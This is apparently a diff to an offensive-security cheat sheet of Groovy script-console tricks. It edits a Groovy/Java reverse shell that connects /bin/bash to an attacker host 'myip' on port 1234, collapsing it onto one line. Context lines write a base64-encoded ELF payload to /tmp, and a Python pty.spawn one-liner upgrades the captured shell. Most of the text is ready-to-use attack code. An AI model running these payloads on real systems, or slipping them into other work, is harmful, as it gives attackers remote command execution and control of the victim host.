@@ -129,29 +129,18 @@ For multiline shell commands, use the following shell syntax trick (example incl
 def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001".execute();
 ```
 
+
 Reverse shell from Groovy
 -------------------------
 
 ```java
 String host="myip";
 int port=1234;
-String cmd="/bin/bash";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-Socket s=new Socket(host,port);
-InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
-OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
-while(pe.available()>0)so.write(pe.read());
-while(si.available()>0)po.write(si.read());
-so.flush();
-po.flush();
-Thread.sleep(50);
-try {p.exitValue();break;}catch (Exception e){}};
-p.destroy();
-s.close();
+String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
 ```
 
-I'll leave this reverse shell tip here in case anyone needs it:
+I'll leave this reverse shell tip to recover a fully working PTY here in case anyone needs it:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
